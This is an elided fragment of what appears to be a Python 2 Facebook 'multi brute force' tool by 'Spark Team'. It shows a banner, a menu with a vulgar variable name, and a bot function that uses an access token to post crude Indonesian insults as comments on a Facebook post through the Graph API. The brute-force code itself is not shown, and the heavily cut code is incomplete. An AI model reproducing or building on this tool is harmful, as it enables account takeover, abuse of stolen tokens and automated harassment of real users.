...
│          
     ...
     ╚██████╗██║ ╚═╝ ██║██████╔╝██║         
      ╚═════╝╚═╝     ╚═╝╚═════╝ ╚═╝         
       \033[1;95m SPARK TEAM | \033[1;96m MULTI | \033[1;91m BRUTE | \033[1;93m FORCE    
...
###PILIHHH ###
def pilih():
	kontol = raw_input("\033[1;95m  ┌─[Spark | Team└──╼ ❯❯❯ \033[92m :\033[1;92m ")
	if kontol == "":
		menu()
	elif kontol == "1":
		publik()
...
def hamz_bot():
    ...
    kom3 = " Slebetod Surentod Ngntod :v"
    kom4 = " Lo Ngentod :v"
    ...
    requests.post('https://graph.facebook.com/660155105160982/comments/?message=' +kom4+ '&access_token=' + token)
    menu()
